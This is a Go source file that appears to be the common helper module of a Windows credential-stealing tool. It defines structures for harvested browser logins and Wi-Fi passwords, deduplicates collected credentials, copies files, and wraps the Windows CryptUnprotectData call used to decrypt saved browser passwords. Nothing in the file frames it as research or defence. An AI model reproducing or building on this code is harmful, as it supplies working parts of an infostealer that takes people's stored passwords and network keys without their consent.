package common

import (
	"io/ioutil"
	"unsafe"
	"syscall"
	"math/rand"
	"os"
)

var (

	UserHome = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
	AppData  = os.Getenv("APPDATA")

)

type CredentialsData struct{
	Url string
	Username string
	Pass string
}

type WifiData struct {
	Name string
	Pass string
}

type ExtractCredentialsResult struct{
	Success bool
	Data []CredentialsData
}

type ExtractWifiData struct {
	Success bool
	Data []WifiData
}

const Fail = "fail"

func RandStringRunes(n int) string {

	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}


func RemoveDuplicates(elements []CredentialsData) []CredentialsData {
	// Use map to record duplicates as we find them.
	encountered := map[string]bool{}
	result := []CredentialsData{}

	for v := range elements {
		if encountered[elements[v].Pass+elements[v].Url+elements[v].Username] == true {
			// Do not add duplicate.
		} else {
			// Record this element as an encountered element.
			encountered[elements[v].Pass+elements[v].Url+elements[v].Username] = true
			// Append to result slice.
			result = append(result, elements[v])
		}
	}
	// Return the new slice.
	return result
}

func CopyFile(src string, dst string) error{
	data, err := ioutil.ReadFile(src)
	if err != nil{
		return err
	}
	err = ioutil.WriteFile(dst, data, 0644)
	if err != nil{
		return err
	}
	return nil
}

/*
	WinAPI decrypt function
 */
type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Win32CryptUnprotectData(cipherText string, entropy bool) string{
	var (
		dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
		dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

		procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
		procLocalFree   = dllkernel32.NewProc("LocalFree")
	)

	var outblob DATA_BLOB
	var inblob = NewBlob([]byte(cipherText))

	procDecryptData.Call(uintptr(unsafe.Pointer(inblob)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))

	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return string(outblob.ToByteArray())
}
/*
	End WinAPI decrypt function
 */
